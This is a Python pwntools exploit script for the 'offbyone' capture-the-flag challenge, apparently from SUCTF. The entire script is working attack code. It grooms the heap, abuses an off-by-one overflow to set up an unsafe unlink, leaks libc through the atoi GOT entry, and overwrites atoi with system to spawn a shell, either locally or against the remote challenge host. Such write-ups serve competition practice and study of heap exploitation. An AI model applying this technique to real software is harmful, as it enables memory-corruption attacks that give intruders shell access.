#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.arch = 'amd64'
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./offbyone")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./offbyone")
    libc = elf.libc


else:
    io = remote("pwn.suctf.asuri.org", 20004)
    libc = ELF("./libc-2.23.so")


def DEBUG(cmd = ""):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

def create(length, data):
    io.sendlineafter("edit\n", "1")
    io.sendlineafter("len\n", str(length))
    io.sendafter("data\n", data)

def delete(idx):
    io.sendlineafter("edit\n", "2")
    io.sendlineafter("id\n", str(idx))

def show(idx):
    io.sendlineafter("edit\n", "3")
    io.sendlineafter("id\n", str(idx))

def edit(idx, data):
    io.sendlineafter("edit\n", "4")
    io.sendlineafter("id\n", str(idx))
    io.sendafter("data\n", data)

if __name__ == "__main__":
    #  DEBUG("b *0x4009C2\nc")
    create(0xf0, '0' * 0xf0)
    create(0xf0, '1' * 0xf0)
    create(0xf0, '2' * 0xf0)
    create(0xf0, '3' * 0xf0)
    create(0xf0, '4' * 0xf0)
    create(0x80, '5' * 0x80)
    create(0x80, '6' * 0x80)

    delete(3)

    create(0xf8, '3' * 0xf8)

    data = flat([0, 0xf0, 0x6020D8 - 0x18, 0x6020D8 - 0x10])
    data = data.ljust(0xf0)
    data += p64(0xf0) + '\0'

    edit(3, data)
    #  pause()

    delete(4)

    edit(3, p64(elf.got['atoi']))
    show(0)

    libcBase = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - libc.sym['atoi']
    success("libcBase -> {:#x}".format(libcBase))
    pause()

    edit(0, p64(libcBase + libc.sym['system']))
    io.sendline("/bin/sh\0")
    
    io.interactive()
    io.close()



